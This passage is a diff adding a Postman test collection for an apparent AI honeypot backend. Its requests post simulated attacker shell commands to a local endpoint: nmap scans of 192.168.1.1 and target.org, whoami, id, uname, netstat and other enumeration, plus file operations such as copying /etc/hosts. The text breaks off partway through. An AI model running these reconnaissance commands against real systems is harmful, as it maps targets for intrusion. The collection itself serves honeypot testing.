@@ -1,0 +1,2606 @@
+{
+  "info": {
+    "_postman_id": "xynera-ai-backend-all-commands-v1",
+    "name": "Xynera AI Backend - All Commands Postman Collection",
+    "description": "Complete Postman Collection covering every command, decoy retrieval, recon, malware attempt, privilege escalation, and system utility supported by Xynera AI Backend & Honeypot Router.",
+    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+  },
+  "variable": [
+    {
+      "key": "baseUrl",
+      "value": "http://127.0.0.1:5000",
+      "type": "string"
+    },
+    {
+      "key": "attackerIp",
+      "value": "192.168.1.100",
+      "type": "string"
+    }
+  ],
+  "item": [
+    {
+      "name": "0. System Health",
+      "item": [
+        {
+          "name": "Check Backend Health",
+          "request": {
+            "method": "GET",
+            "header": [
+              {
+                "key": "Accept",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "url": {
+              "raw": "{{baseUrl}}/health",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "health"
+              ]
+            },
+            "description": "Returns status of Xynera AI backend server."
+          }
+        }
+      ]
+    },
+    {
+      "name": "1. Reconnaissance & Enumeration",
+      "item": [
+        {
+          "name": "nmap -sS -v 192.168.1.1",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"nmap -sS -v 192.168.1.1\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"Reconnaissance\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Nmap SYN scan against IP\n\nCommand: `nmap -sS -v 192.168.1.1`\nCategory: `Reconnaissance`"
+          }
+        },
+        {
+          "name": "nmap -p 80,443 target.org",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"nmap -p 80,443 target.org\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"Reconnaissance\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Nmap targeted port scan\n\nCommand: `nmap -p 80,443 target.org`\nCategory: `Reconnaissance`"
+          }
+        },
+        {
+          "name": "whoami",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"whoami\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"Enumeration\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Check current user identity\n\nCommand: `whoami`\nCategory: `Enumeration`"
+          }
+        },
+        {
+          "name": "id",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"id\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"Enumeration\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Check UID, GID and user groups\n\nCommand: `id`\nCategory: `Enumeration`"
+          }
+        },
+        {
+          "name": "uname -a",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"uname -a\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"Enumeration\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Check Linux kernel & OS details\n\nCommand: `uname -a`\nCategory: `Enumeration`"
+          }
+        },
+        {
+          "name": "hostname",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"hostname\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"Enumeration\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Get system hostname\n\nCommand: `hostname`\nCategory: `Enumeration`"
+          }
+        },
+        {
+          "name": "uptime",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"uptime\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"Enumeration\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "System load and uptime\n\nCommand: `uptime`\nCategory: `Enumeration`"
+          }
+        },
+        {
+          "name": "lscpu",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"lscpu\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"Enumeration\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Display CPU architecture details\n\nCommand: `lscpu`\nCategory: `Enumeration`"
+          }
+        },
+        {
+          "name": "lsb_release -a",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"lsb_release -a\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"Enumeration\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Display Linux distribution release details\n\nCommand: `lsb_release -a`\nCategory: `Enumeration`"
+          }
+        },
+        {
+          "name": "w",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"w\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"Enumeration\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Show logged in users and activities\n\nCommand: `w`\nCategory: `Enumeration`"
+          }
+        },
+        {
+          "name": "last -n 5",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"last -n 5\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"Enumeration\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Display recent login history\n\nCommand: `last -n 5`\nCategory: `Enumeration`"
+          }
+        }
+      ]
+    },
+    {
+      "name": "2. Network Inspection",
+      "item": [
+        {
+          "name": "netstat",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"netstat\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"Network Inspection\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Display active socket connections\n\nCommand: `netstat`\nCategory: `Network Inspection`"
+          }
+        },
+        {
+          "name": "netstat -antp",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"netstat -antp\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"Network Inspection\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Display active TCP ports with PID/program\n\nCommand: `netstat -antp`\nCategory: `Network Inspection`"
+          }
+        },
+        {
+          "name": "netstat -tulpn",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"netstat -tulpn\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"Network Inspection\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "List listening TCP/UDP ports\n\nCommand: `netstat -tulpn`\nCategory: `Network Inspection`"
+          }
+        },
+        {
+          "name": "ss -tulpn",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"ss -tulpn\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"Network Inspection\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Display socket statistics\n\nCommand: `ss -tulpn`\nCategory: `Network Inspection`"
+          }
+        },
+        {
+          "name": "ifconfig eth0",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"ifconfig eth0\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"Network Inspection\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Interface IP configuration for eth0\n\nCommand: `ifconfig eth0`\nCategory: `Network Inspection`"
+          }
+        },
+        {
+          "name": "ip addr show",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"ip addr show\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"Network Inspection\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Show network interfaces and IP addresses\n\nCommand: `ip addr show`\nCategory: `Network Inspection`"
+          }
+        },
+        {
+          "name": "ping -c 4 8.8.8.8",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"ping -c 4 8.8.8.8\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"Network Inspection\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Send ICMP ping requests\n\nCommand: `ping -c 4 8.8.8.8`\nCategory: `Network Inspection`"
+          }
+        },
+        {
+          "name": "traceroute 8.8.8.8",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"traceroute 8.8.8.8\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"Network Inspection\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Trace network route hops\n\nCommand: `traceroute 8.8.8.8`\nCategory: `Network Inspection`"
+          }
+        },
+        {
+          "name": "dig example.com",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"dig example.com\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"Network Inspection\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "DNS lookup query\n\nCommand: `dig example.com`\nCategory: `Network Inspection`"
+          }
+        },
+        {
+          "name": "nslookup target.org",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"nslookup target.org\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"Network Inspection\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Name server lookup query\n\nCommand: `nslookup target.org`\nCategory: `Network Inspection`"
+          }
+        },
+        {
+          "name": "host target.org",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"host target.org\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"Network Inspection\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Domain host resolution query\n\nCommand: `host target.org`\nCategory: `Network Inspection`"
+          }
+        }
+      ]
+    },
+    {
+      "name": "3. File System Operations",
+      "item": [
+        {
+          "name": "pwd",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"pwd\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"File System\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Print working directory\n\nCommand: `pwd`\nCategory: `File System`"
+          }
+        },
+        {
+          "name": "ls -la /var/www",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"ls -la /var/www\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"File System\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "List web directory contents with permissions\n\nCommand: `ls -la /var/www`\nCategory: `File System`"
+          }
+        },
+        {
+          "name": "mkdir /tmp/test",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"mkdir /tmp/test\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"File System\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Create new temporary directory\n\nCommand: `mkdir /tmp/test`\nCategory: `File System`"
+          }
+        },
+        {
+          "name": "cd /tmp",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"cd /tmp\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"File System\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Change directory to /tmp\n\nCommand: `cd /tmp`\nCategory: `File System`"
+          }
+        },
+        {
+          "name": "touch /tmp/testfile.txt",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"touch /tmp/testfile.txt\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"File System\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Create empty file\n\nCommand: `touch /tmp/testfile.txt`\nCategory: `File System`"
+          }
+        },
+        {
+          "name": "cp /etc/hosts /tmp/hosts_bak",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"cp /etc/hosts /tmp/hosts_bak\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"File System\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Copy file\n\nCommand: `cp /etc/hosts /tmp/hosts_bak`\nCategory: `File System`"
+          }
+        },
+        {
+          "name": "mv /tmp/hosts_bak /tmp/hosts_new",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"mv /tmp/hosts_bak /tmp/hosts_new\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"File System\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Move/rename file\n\nCommand: `mv /tmp/hosts_bak /tmp/hosts_new`\nCategory: `File System`"
+          }
+        },
+        {
+          "name": "rm /tmp/hosts_new",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"ip\": \"{{attackerIp}}\",\n  \"command\": \"rm /tmp/hosts_new\",\n  \"session_id\": \"sess_all_cmds_demo\",\n  \"history\": [\n    \"whoami\",\n    \"pwd\"\n  ],\n  \"local_attack_type\": \"File System\",\n  \"cwd\": \"/home/ubuntu\",\n  \"hostname\": \"web-prod-01\",\n  \"username\": \"ubuntu\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{baseUrl}}/process",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "process"
+              ]
+            },
+            "description": "Remove file\n\nCommand: `rm /tmp/hosts_new`\nCategory: `File System`"
+          }
+        },
+        {
+          "name": "df -h",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json",
+                "type": "text"
+              }
+            ],
+            "body": {
+              "mode": "raw",
